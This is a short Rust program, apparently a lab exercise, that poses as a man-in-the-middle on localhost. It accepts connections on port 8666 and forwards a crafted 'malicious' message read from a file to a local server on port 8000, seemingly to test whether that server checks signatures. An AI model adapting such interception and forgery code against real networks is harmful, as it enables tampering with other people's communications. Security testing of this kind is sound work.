use std::net::TcpListener;
use std::io::Read;
use std::io::Write;
use std::error::Error;
use std::net::TcpStream;
use std::fs::File;

// Declare the `client_message` module so it can be used in this file
mod client_message;
use client_message::ClientMessage;

fn handle_client() -> Result<(), Box<dyn Error>> {
    // Craft a new message and sign using a new keypair, making this an active MITM.
    let malicious_message = craft_malicious_message()?;
    forward_to_server(malicious_message.encode()?)?;

    Ok(())
}

fn craft_malicious_message() -> Result<ClientMessage, Box<dyn Error>> {
    // Create malicious data to forward to the server
    let file_path = "src/malicious_message.txt";
    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    
    println!("Crafted new message based on malicious_message.txt");

    Ok(ClientMessage::new(buffer).unwrap())
}

fn forward_to_server(buffer: Vec<u8>) -> Result<(), Box<dyn Error>> {
    // Connect to the real server
    let server_port = 8000; // Real server port
    let mut stream = TcpStream::connect(format!("127.0.0.1:{server_port}"))?;
    println!("Connected to server on {server_port}");

    stream.write_all(&buffer)?;
    println!("Data forwarded to server!");

    Ok(())
}

fn main() -> Result<(), Box<dyn Error>> {
    let port = 8666;
    let listener = TcpListener::bind(format!("127.0.0.1:{port}"))?;
    println!("MITM listening on port {port}...");

    // Loop through incoming connection streams indefinitely
    for stream in listener.incoming() {
        match stream {
            Ok(_stream) => {
                handle_client()?;
            }
            Err(e) => {
                eprint!("Failed to accept connection: {}", e);
            }
        }
    }

    Ok(())
}